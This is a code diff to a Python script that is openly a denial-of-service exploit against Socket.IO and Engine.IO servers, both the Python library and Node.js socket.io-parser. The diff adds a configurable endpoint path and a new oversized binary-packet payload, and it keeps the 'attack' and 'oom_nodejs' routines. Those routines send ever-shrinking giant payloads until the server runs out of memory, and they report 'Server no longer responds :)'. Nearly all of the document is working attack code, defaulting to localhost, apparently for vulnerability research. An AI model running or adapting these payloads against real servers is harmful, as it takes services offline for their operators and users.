@@ -5,6 +5,7 @@ import requests
 
 
 DEFAULT_MAX = 100000000
+DEFAULT_PATH = 'socket.io/'
 
 
 def repeat_packet(packet, total_length):
@@ -25,8 +26,21 @@ def standard_payload(total_length):
 def giant_packet(total_length):
     # 4 means MESSAGE in engineio (data[0])
     # Then we follow with a massive integer
-    # to cause iteration in socketio.Packet.decode
+    # to cause iteration in socketio.Packet.decode / socket.io-parser.decodeString
     prefix = '4'
+    data_length = total_length - 2
+    while data_length + 1 + len(str(data_length)) > total_length:
+        data_length -= 1
+    packet = '%d:%s' % (data_length, prefix + '2' * (data_length - len(prefix)))
+    return packet
+
+
+def giant_binary_packet(total_length):
+    # 4 means MESSAGE in engineio
+    # 5 means BINARY_MESSAGE in socketio
+    # Then we follow with a massive integer
+    # to cause iteration in socketio.Packet.decode / socket.io-parser.decodeString
+    prefix = '45'
     data_length = total_length - 2
     while data_length + 1 + len(str(data_length)) > total_length:
         data_length -= 1
@@ -57,8 +71,8 @@ def timestr():
     return "&t=" + str(time.time())
 
 
-def get_new_session_url(host):
-    base_url = host + "/socket.io/?EIO=3&transport=polling"
+def get_new_session_url(host, path):
+    base_url = f"{host}/{path}?EIO=3&transport=polling"
     # Create session
     response = requests.get(base_url + timestr()).text
     print("Response from server", repr(response))
@@ -67,8 +81,8 @@ def get_new_session_url(host):
     return base_url + "&sid=" + sid
 
 
-def attack(host, payload_length=DEFAULT_MAX, make_payload=many_tiny_packets):
-    session_url = get_new_session_url(host)
+def attack(host, payload_length=DEFAULT_MAX, make_payload=many_tiny_packets, path=DEFAULT_PATH):
+    session_url = get_new_session_url(host, path)
     # Fire payload
     payload = make_payload(payload_length)
     print("Firing payload of length", len(payload), repr(payload[:100]))
@@ -86,8 +100,8 @@ def attack(host, payload_length=DEFAULT_MAX, make_payload=many_tiny_packets):
         print("Duration:", int(time.time() - start_time))
 
 
-def send_one_heartbeat(host, sid):
-    session_url = host + "/socket.io/?EIO=3&transport=polling&sid=" + sid
+def send_one_heartbeat(host, sid, path=DEFAULT_PATH):
+    session_url = f"{host}/{path}?EIO=3&transport=polling&sid={sid}"
     final_response = requests.post(
         session_url + timestr(),
         data='1:2',
@@ -96,32 +110,37 @@ def send_one_heartbeat(host, sid):
     print("Server returned", repr(final_response))
 
 
-def get_responses(host, sid):
-    session_url = host + "/socket.io/?EIO=3&transport=polling&sid=" + sid
+def get_responses(host, sid, path=DEFAULT_PATH):
+    session_url = f"{host}/{path}?EIO=3&transport=polling&sid={sid}"
     final_response = requests.get(
         session_url + timestr(),
     ).text
     print("Server returned", repr(final_response))
 
 
-def x(payload_length=DEFAULT_MAX, make_payload=many_tiny_packets):
-    return attack("http://127.0.0.1:5000", payload_length, make_payload)
+def x(payload_length=DEFAULT_MAX, make_payload=many_tiny_packets, path=DEFAULT_PATH):
+    return attack("http://127.0.0.1:5000", payload_length, make_payload, path)
 
 
-def oom_nodejs(host='http://127.0.0.1:5000', payload_length=DEFAULT_MAX, make_payload=many_tiny_packets):
+def oom_nodejs(
+    host='http://127.0.0.1:5000',
+    payload_length=DEFAULT_MAX,
+    make_payload=many_tiny_packets,
+    path=DEFAULT_PATH,
+):
     """Try to find a DoS payload which isn't so large that we hit the ping timeout before OOM."""
     try:
         while payload_length > 50000:  # No point continuing shorter than this
-            attack(host, payload_length, make_payload)
+            attack(host, payload_length, make_payload, path)
             payload_length = int(payload_length * 0.7)  # Try slightly smaller payload avoiding ping timed out
-        get_new_session_url(host)
+        get_new_session_url(host, path)
     except requests.exceptions.ConnectionError:
         print("Server no longer responds :)")
     else:
         print("Server survived :(")
 
 
-def oom_nodejs_all(host='http://127.0.0.1:5000', payload_length=DEFAULT_MAX):
+def oom_nodejs_all(host='http://127.0.0.1:5000', payload_length=DEFAULT_MAX, path=DEFAULT_PATH):
     for make_payload in (many_tiny_packets, many_heartbeats, giant_packet):
         print("Trying payload type:", make_payload.__name__)
-        oom_nodejs(host, payload_length, make_payload)
+        oom_nodejs(host, payload_length, make_payload, path)
